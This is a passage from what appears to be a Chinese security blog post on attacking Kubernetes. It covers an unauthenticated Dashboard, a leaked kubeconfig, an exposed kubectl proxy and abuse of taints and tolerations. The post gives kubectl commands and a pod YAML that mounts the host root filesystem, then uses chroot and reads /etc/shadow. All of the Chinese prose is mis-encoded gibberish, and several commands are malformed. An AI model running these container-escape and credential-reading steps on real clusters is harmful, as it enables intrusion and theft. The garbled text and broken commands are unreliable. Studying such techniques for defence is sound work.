<h2 id="ä¸‰ï¼ŒDashboard-æœªæˆæƒè®¿é—®"><a href="#ä¸‰ï¼ŒDashboard-æœªæˆæƒè®¿é—®" class="headerlink" title="ä¸‰ï¼ŒDashboard æœªæˆæƒè®¿é—®"></a>ä¸‰ï¼ŒDashboard æœªæˆæƒè®¿é—®</h2><p>é»˜è®¤ç«¯å£ï¼š8001<br>é…ç½®ä¸å½“å¯¼è‡´ dashboard æœªæˆæƒè®¿é—®ï¼Œé€šè¿‡ dashboard æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ•´ä¸ªé›†ç¾¤ã€‚kubernetes dashboard çš„æœªæˆæƒå…¶å®åˆ†ä¸¤ç§æƒ…å†µ:<br>ä¸€ç§æ˜¯åœ¨æœ¬èº«å°±å­˜åœ¨ç€ä¸éœ€è¦ç™»å½•çš„ http æ¥å£ï¼Œä½†æ¥å£æœ¬èº«å¹¶ä¸ä¼šæš´éœ²å‡ºæ¥ï¼Œå¦‚æ¥å£è¢«æš´éœ²åœ¨å¤–ï¼Œå°±ä¼šå¯¼è‡´ dashboard æœªæˆæƒã€‚å¦å¤–ä¸€ç§æƒ…å†µåˆ™æ˜¯å¼€å‘å«Œç™»å½•éº»çƒ¦ï¼Œä¿®æ”¹äº†é…ç½®æ–‡ä»¶ï¼Œä½¿å¾—å®‰å…¨æ¥å£ https çš„ dashboard é¡µé¢å¯ä»¥è·³è¿‡ç™»å½•ã€‚</p>
<p><strong>æ¼æ´å¤ç°ï¼š</strong></p>
<p>ç”¨æˆ·å¼€å¯ enable-skip-login æ—¶å¯ä»¥åœ¨ç™»å½•ç•Œé¢ç‚¹å‡»è·³è¿‡ç™»å½•è¿› dashboard*</p>
<p>Kubernetes-dashboard ç»‹å®š cluster-admin (æ‹¥æœ‰ç®¡ç†é›†ç¾¤çš„æœ€é«˜æƒé™)</p>
<p>å¯åŠ¨:kubectl createf recommended.yaml<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-9.png"></p>
<p>è¿›å…¥é¡µé¢åï¼Œç™»å½•æ—éƒ½ Skip, å¯è·³è¿‡ç™»å½•ç›´æ¥è¿›å…¥</p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-10-1024x254.png"></p>
<p>åé€ƒé€¸æ–¹æ³•ä¸ä¸Šé¢ç±»ä¼¼</p>
<h2 id="äº”ï¼ŒConfigfile-é‰´æƒæ–‡ä»¶æ³„æ¼"><a href="#äº”ï¼ŒConfigfile-é‰´æƒæ–‡ä»¶æ³„æ¼" class="headerlink" title="äº”ï¼ŒConfigfile é‰´æƒæ–‡ä»¶æ³„æ¼"></a>äº”ï¼ŒConfigfile é‰´æƒæ–‡ä»¶æ³„æ¼</h2><p>æ”»å‡»è€…é€šè¿‡ webshellã€Github ç­‰æ‹¿åˆ°äº† K8s é…ç½®çš„ Config æ–‡ä»¶ï¼Œæ“ä½œé›†ç¾¤ï¼Œä»è€Œæ¥ç®¡æ‰€æœ‰å®¹å™¨ã€‚K8s configfile ä½œä¸º K8s é›†ç¾¤çš„ç®¡ç†å‡­è¯ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³ K8s é›†ç¾¤çš„è¯¦ç»†ä¿¡æ¯ (API Serverã€ç™»å½•å‡­è¯)ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿè®¿é—®åˆ°æ­¤æ–‡ä»¶ (å¦‚åŠå…¬ç½‘å‘˜å·¥æœºå™¨å…¥ä¾µã€æ³„éœ²åˆ° Github çš„ä»£ç ç­‰)ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡ API Server æ¥ç®¡ K8s é›†ç¾¤ï¼Œå¸¦æ¥é£é™©éšæ‚£ã€‚ç”¨æˆ·å‡­è¯ä¿å­˜åœ¨ kubeconfig æ–‡ä»¶ä¸­ï¼Œé€šè¿‡ä»¥ä¸‹é¡ºåºæ¥æ‰¾åˆ° kubeconfig æ–‡ä»¶:</p>
<ul>
<li><p>1ï¼Œå¦‚æœæä¾›äº†â€“kubeconfig å‚æ•°ï¼Œå°±ä½¿ç”¨æä¾›çš„ kubeconfig</p>
</li>
<li><p>2ï¼Œæ–‡ä»¶å¦‚æœæ²¡æœ‰æä¾›â€“kubeconfig å‚æ•°ï¼Œä½†è®¾ç½®äº†ç¯å¢ƒå˜é‡ SKUBECONFIGï¼Œåˆ™ä½¿ç”¨è¯¥ç¯å¢ƒå˜é‡æä¾›çš„ kubeconfig æ–‡ä»¶</p>
</li>
<li><p>3ï¼Œå¦‚æœä»¥ä¸Šä¸¤ç§æƒ…å†µéƒ½æ²¡æœ‰ï¼Œkubectl å°±ä½¿ç”¨é»˜è®¤çš„ kubeconfig æ–‡ä»¶<br>~&#x2F;.kube&#x2F;config</p>
</li>
</ul>
<p>1ï¼Œä½¿ç”¨ config æ–‡ä»¶è¿æ¥:<br>kubectl -s <a target="_blank" rel="noopener" href="https://192.168.139.130:6443/">https://192.168.139.130:6443/</a> â€“kubeconfig&#x3D;config â€“insecure-skip-tls-verify&#x3D;true get nodes</p>
<p>2ã€ä¸Šä¼ åˆ©ç”¨ test.yaml åˆ›å»º pod</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f test.yaml -n default--kubeconfig=config</span><br></pre></td></tr></table></figure>
<p>3ï¼Œè¿æ¥ pod åè¿›è¡Œå®¹å™¨æŒ‚è½½é€ƒé€¸</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it test bash -n default--kubeconfig=config</span><br><span class="line">cd/mnt</span><br><span class="line">chroot . bash</span><br></pre></td></tr></table></figure>
<h2 id="å…­ï¼ŒKubectl-Proxy-ä¸å®‰å…¨é…ç½®"><a href="#å…­ï¼ŒKubectl-Proxy-ä¸å®‰å…¨é…ç½®" class="headerlink" title="å…­ï¼ŒKubectl Proxy ä¸å®‰å…¨é…ç½®"></a>å…­ï¼ŒKubectl Proxy ä¸å®‰å…¨é…ç½®</h2><p>å½“è¿ç»´äººå‘˜éœ€è¦æŸä¸ªç¯å¢ƒæš´éœ²ç«¯å£æˆ–è€… IP æ—¶ï¼Œä¼šç”¨åˆ° Kubectl Proxyï¼Œä½¿ç”¨ kubectl proxy å‘½ä»¤å°±å¯ä»¥ä½¿ API server ç›‘å¬åœ¨æœ¬åœ°çš„ xxxx ç«¯å£ä¸Š</p>
<p>ç¯å¢ƒæ­å»º:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl--insecure-skip-tls-verify proxy-accept-hosts=^.*$ --address=0.0.0.0 --port=8009</span><br><span class="line">//æš´éœ²8009ç«¯å£</span><br></pre></td></tr></table></figure>
<h2 id="ä¸ƒï¼ŒK8S-çš„æ±¡ç‚¹æ¨ªå‘ç§»åŠ¨"><a href="#ä¸ƒï¼ŒK8S-çš„æ±¡ç‚¹æ¨ªå‘ç§»åŠ¨" class="headerlink" title="ä¸ƒï¼ŒK8S çš„æ±¡ç‚¹æ¨ªå‘ç§»åŠ¨"></a>ä¸ƒï¼ŒK8S çš„æ±¡ç‚¹æ¨ªå‘ç§»åŠ¨</h2><p>åœ¨ K8S ä¸­ï¼Œåˆ©ç”¨æ±¡ç‚¹ï¼ˆTaintï¼‰è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ¸—é€æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æ“çºµæˆ–ç»•è¿‡é›†ç¾¤ä¸­çš„æ±¡ç‚¹å’Œå®¹å¿ï¼ˆTolerationï¼‰æœºåˆ¶ï¼Œå°†æ¶æ„è´Ÿè½½ï¼ˆPodï¼‰è°ƒåº¦åˆ°åŸæœ¬å—ä¿æŠ¤çš„èŠ‚ç‚¹ä¸Šï¼Œä»è€Œçªç ´éš”ç¦»å¹¶è¿›ä¸€æ­¥æ¸—é€é›†ç¾¤ã€‚æ±¡ç‚¹å’Œå®¹å¿æ˜¯ K8S çš„åˆæ³•åŠŸèƒ½ï¼Œè®¾è®¡ç›®çš„æ˜¯å¢å¼ºå®‰å…¨æ€§ã€‚é—®é¢˜é€šå¸¸æºäºé”™è¯¯çš„æƒé™åˆ†é…ï¼ˆå¦‚è¿‡å®½çš„ RBAC ç­–ç•¥ï¼‰æˆ–ä¸å®‰å…¨çš„å®¹å¿é…ç½®ï¼ˆå¦‚ Pod å®¹å¿æ‰€æœ‰æ±¡ç‚¹ï¼‰ã€‚</p>
<p>è®¾ç½®æ±¡ç‚¹:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è®¾ç½®æ±¡ç‚¹ï¼š</span><br><span class="line">kubectl taint nodes nodel xtz=valuel:NoSchedule</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹èŠ‚ç‚¹ä¸Šçš„æ±¡ç‚¹è®¾ç½®ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node &lt;èŠ‚ç‚¹åç§°&gt;</span><br><span class="line">Taintsä¸­ NoSchodule-ä¸ºæ²¡æœ‰æ±¡ç‚¹ï¼Œnoneä¹Ÿæ²¡æœ‰æ±¡ç‚¹</span><br></pre></td></tr></table></figure>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-11-1024x475.png"><br>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ±¡ç‚¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node | grep &#x27;Taints&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>å®¹å¿ï¼ˆTolerationï¼‰</strong></p>
<p>å®¹å¿æ˜¯ Pod ä¸Šè®¾ç½®çš„å±æ€§ï¼Œå…è®¸ Pod è¢«è°ƒåº¦åˆ°å¸¦æœ‰ç‰¹å®šæ±¡ç‚¹çš„èŠ‚ç‚¹ã€‚</p>
<p>åˆ›å»ºå¸¦æœ‰å®¹å¿å‚æ•°çš„ Pod (å¿…è¦æ—¶å¯ä»¥ä¿®æ”¹ Yaml ä½¿ Pod å¢åŠ åˆ°ç‰¹å®šçš„ Node ä¸Šå»)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">é€šè¿‡<span class="built_in">cat</span>å†™å…¥1.yamlé…ç½®æ–‡ä»¶</span></span><br><span class="line">cat &gt; 1.yaml &lt;&lt; EOF</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: control-master-15</span><br><span class="line">spec:</span><br><span class="line">  tolerations:</span><br><span class="line">    - key: node-role.kubernetes.io/master  //ä½¿Podå¢åŠ åˆ°ç‰¹å®šçš„Nodeä¸Šå»</span><br><span class="line">      operator: Exists</span><br><span class="line">      effect: NoSchedule</span><br><span class="line">  containers:</span><br><span class="line">    - name: control-master-15</span><br><span class="line">      image: ubuntu:18.04</span><br><span class="line">      command: [&quot;/bin/sleep&quot;, &quot;3650d&quot;]</span><br><span class="line">      volumeMounts:</span><br><span class="line">      - name: master</span><br><span class="line">        mountPath: /master</span><br><span class="line">  volumes:</span><br><span class="line">  - name: master</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">      type: Directory</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">åˆ›å»ºPod</span></span><br><span class="line">kubectl create -f control-master.yaml</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">éƒ¨ç½²æƒ…å†µ</span></span><br><span class="line">kubectl get deploy -o wide</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Podè¯¦æƒ…</span></span><br><span class="line">kubectl get pod -o wide</span><br></pre></td></tr></table></figure>
<p>è·å¾— Master æ§åˆ¶ç«¯</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec control-master-15 -it bash</span><br><span class="line">chroot /master bash</span><br><span class="line">ls -al</span><br><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure></div><div class="tags"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" rel="tag">äº‘å®‰å…¨</a></li></ul></div><div class="post-nav"><a class="pre" href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-k8s%E6%90%AD%E5%BB%BA/">äº‘æ”»é˜²-K8Sæ­å»º</a><a class="next" href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/">ä¿¡æ¯æ”¶é›†-3</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/about/" title="å…³äº"><img class="nofancybox" src="/img/avatar.jpg"/></a><p>æ‰€å¹¸ä»æœ‰å…‰.</p><a class="info-icon" href="https://hackerhao.top" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/isMyHao" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> åˆ†ç±»</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Java-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">Java Webå¸¸è§æ¼æ´</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">JavaåŸºç¡€çŸ¥è¯†</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Javaå®‰å…¨</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Js%E5%AE%89%E5%85%A8/">Jså®‰å…¨</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHPä»£ç å®¡è®¡</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHPå®‰å…¨</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Win%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">Winæƒé™æå‡</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E6%8F%90%E6%9D%83/">linuxææƒ</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">äº‘å®‰å…¨</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">å…æ€</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91/">å†…ç½‘</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">åŸºç¡€çŸ¥è¯†</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">æƒé™æå‡</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/">æ¼æ´å‘ç°</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">é¶åœº</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> æ ‡ç­¾</i></div><div class="tagcloud"><a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">åŸºç¡€</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 15px;">å…æ€</a> <a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">JavaåŸºç¡€</a> <a href="/tags/Js%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Jså®‰å…¨</a> <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Javaå®‰å…¨</a> <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">PHPä»£ç å®¡è®¡</a> <a href="/tags/PHP%E5%AE%89%E5%85%A8/" style="font-size: 15px;">PHPå®‰å…¨</a> <a href="/tags/Java-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">Java Webå¸¸è§æ¼æ´</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 15px;">linuxææƒ</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 15px;">é¶åœº</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">ä»£ç å®¡è®¡</a> <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 15px;">äº‘å®‰å…¨</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 15px;">å†…ç½‘</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 15px;">æƒé™æå‡</a> <a href="/tags/Win%E6%8F%90%E5%8D%87/" style="font-size: 15px;">Winæå‡</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size: 15px;">æ¼æ´å‘ç°</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> æœ€è¿‘æ–‡ç« </i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/09/02/Java%E5%AE%89%E5%85%A8-CC1-LazyMap/">CommonsCollections1-LazyMap</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/01/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BE/">CommonsCollections1-TransformedMap</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java ååºåˆ—åŒ–æ¼æ´</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/23/java%20Xss%E6%BC%8F%E6%B4%9E/">Java Xssæ¼æ´</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/23/java%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">Java ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/21/java%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Java Webæ–‡ä»¶è®¿é—®æ¼æ´</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/10/ssrf/">SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/07/rce/">Rce</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E7%AF%87-mysql/">sqlæ³¨å…¥ä¸æ•°æ®åº“åˆ©ç”¨</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/07/sql%E6%B3%A8%E5%85%A5/">sqlæ³¨å…¥ä¸æ•°æ®åº“åˆ©ç”¨</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> å‹æƒ…é“¾æ¥</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"></div></div><script type="text/javascript" src="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=undefined" async></script><link rel="stylesheet" type="text/css" href="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=undefined"><script type="text/javascript" src="/js/search.js?v=undefined"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
  search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" color="0,0,0" opacity="0.5" zIndex="-2" count="50" src="https://unpkg.com/canvas-nest.js/dist/canvas-nest.js"></script><script type="text/javascript" src="/js/love.js?v=undefined"></script><script type="text/javascript" src="/js/copycode.js?v=undefined" successtext="å¤åˆ¶æˆåŠŸï¼"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=undefined"><link rel="stylesheet" type="text/css" href="/css/external.css?v=undefined"><script type="text/javascript" src="/js/codeblock-resizer.js?v=undefined"></script><script type="text/javascript" src="/js/smartresize.js?v=undefined"></script></div></body></html>